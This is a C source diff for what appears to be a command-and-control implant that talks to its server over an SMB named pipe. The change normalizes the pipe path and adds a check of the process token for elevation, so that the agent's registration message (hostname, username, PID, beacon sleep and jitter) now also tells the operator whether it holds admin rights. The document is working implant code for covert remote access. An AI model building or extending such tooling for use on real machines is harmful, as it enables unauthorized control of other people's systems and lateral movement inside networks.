@@ -55,8 +55,16 @@ static uint8_t* pipe_read_msg(HANDLE h, size_t *out_len) {
 // ── Pipe open helper ──────────────────────────────────────────────────────────
 
 static HANDLE open_pipe(void) {
+    /* Normalize bare pipe name → \\.\pipe\<name> (mirrors norm_pipe_name in pipe_server.c) */
+    char norm[256] = {0};
+    if (strncmp(AGENT_SMB_PIPE, "\\\\.\\pipe\\", 9) == 0 ||
+        strncmp(AGENT_SMB_PIPE, "\\\\", 2) == 0) {
+        strncpy(norm, AGENT_SMB_PIPE, sizeof(norm) - 1);
+    } else {
+        snprintf(norm, sizeof(norm), "\\\\.\\pipe\\%s", AGENT_SMB_PIPE);
+    }
     wchar_t wpath[256] = {0};
-    MultiByteToWideChar(CP_UTF8, 0, AGENT_SMB_PIPE, -1, wpath, 256);
+    MultiByteToWideChar(CP_UTF8, 0, norm, -1, wpath, 256);
 
     // Retry for up to 30 seconds. WaitNamedPipeW works for local pipes but
     // not remote UNC paths, so we also loop on CreateFile for reliability.
@@ -95,13 +103,24 @@ int transport_smb_register(void) {
         username_j[_j++]=username[_i];
     }
 
+    /* Inline elevation check (TOKEN_ELEVATION). */
+    int elevated = 0;
+    {   HANDLE tok = NULL;
+        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
+            DWORD elev = 0, sz = sizeof(DWORD);
+            if (GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &sz))
+                elevated = (int)elev;
+            CloseHandle(tok);
+        }
+    }
+
     char body[1024];
     snprintf(body, sizeof(body),
         "{\"type\":\"REGISTER\",\"hostname\":\"%s\",\"username\":\"%s\","
         "\"os\":\"windows/amd64\",\"pid\":%lu,\"transport\":\"smb\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"language\":\"c\"}",
+        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"is_admin\":%s,\"language\":\"c\"}",
         hostname, username_j, (unsigned long)GetCurrentProcessId(),
-        AGENT_SLEEP_SEC, AGENT_JITTER_PCT);
+        AGENT_SLEEP_SEC, AGENT_JITTER_PCT, elevated ? "true" : "false");
 
     if (!pipe_write_msg(g_smb_pipe, (const uint8_t*)body, strlen(body)))
         return 0;
